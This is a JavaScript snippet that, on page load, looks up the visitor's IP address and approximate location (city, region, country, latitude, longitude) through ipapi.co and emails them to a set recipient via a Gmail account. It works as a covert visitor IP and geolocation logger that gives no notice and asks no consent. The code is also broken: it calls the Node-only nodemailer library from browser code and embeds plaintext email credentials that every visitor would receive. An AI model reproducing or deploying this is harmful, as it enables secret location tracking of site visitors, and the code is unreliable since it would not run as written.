document.addEventListener('DOMContentLoaded', function () {
    const apiUrl = 'https://ipapi.co/json/';

    // Fetch IP information from the API
    fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            const ipDetails = `
                IP Address: ${data.ip}\n
                City: ${data.city}\n
                Region: ${data.region}\n
                Country: ${data.country_name}\n
                Latitude: ${data.latitude}\n
                Longitude: ${data.longitude}\n
            `;

            // Send IP details via email
            sendEmail(ipDetails);
        })
        .catch(error => {
            console.error('Error fetching IP details:', error);
        });

    function sendEmail(ipDetails) {
        // Email configuration
        const emailUser = 'your.email@gmail.com';
        const emailPass = 'your_email_password';
        const recipientEmail = 'recipient@example.com';

        // Set up a transporter
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: emailUser,
                pass: emailPass
            }
        });

        // Define email options
        const mailOptions = {
            from: emailUser,
            to: recipientEmail,
            subject: 'IP Details',
            text: ipDetails
        };

        // Send email
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.error('Error sending email:', error);
            } else {
                console.log('Email sent:', info.response);
            }
        });
    }
});
